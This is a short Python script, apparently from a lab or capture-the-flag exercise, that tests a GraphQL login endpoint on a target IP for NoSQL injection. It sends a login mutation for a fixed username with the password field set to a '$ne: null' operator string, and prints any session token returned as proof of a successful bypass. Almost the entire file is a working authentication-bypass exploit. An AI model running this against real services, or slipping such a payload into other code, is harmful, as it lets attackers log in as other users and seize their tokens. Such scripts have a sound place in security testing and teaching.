#!/usr/bin/env python3
"""
nosqli_test.py  –  GraphQL NoSQL-i tester (injection via password field)

Usage:
    python3 nosqli_test.py <target-ip>

Returns:
    0  if token received  (injection succeeded)
    1  otherwise          (injection failed)
"""

import sys
import json
import requests   # pip install requests

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target-ip>")
        sys.exit(2)              # bad invocation

    ip   = sys.argv[1]
    url  = f"http://{ip}:4000/graphql"

    payload = {
        "query": """
            mutation Login($username: String!, $password: String!) {
              login(username: $username, password: $password) {
                token
              }
            }
        """,
        "variables": {
            "username": "tpleproc",
            # Classic operator injection string; parsed by JSON.parse() on server
            "password": "{\"$ne\": null}"
        }
    }

    try:
        resp = requests.post(url, json=payload, timeout=5)
        data = resp.json()
    except Exception as e:
        print(f"[!] Request/parse error: {e}")
        sys.exit(1)

    token = (
        data.get("data", {})
            .get("login", {})
            .get("token")
    )

    if token:
        print(f"[✓] Injection succeeded — token: {token}")
        sys.exit(0)
    else:
        print("[✗] Injection failed (no token field)")
        sys.exit(1)

if __name__ == "__main__":
    main()
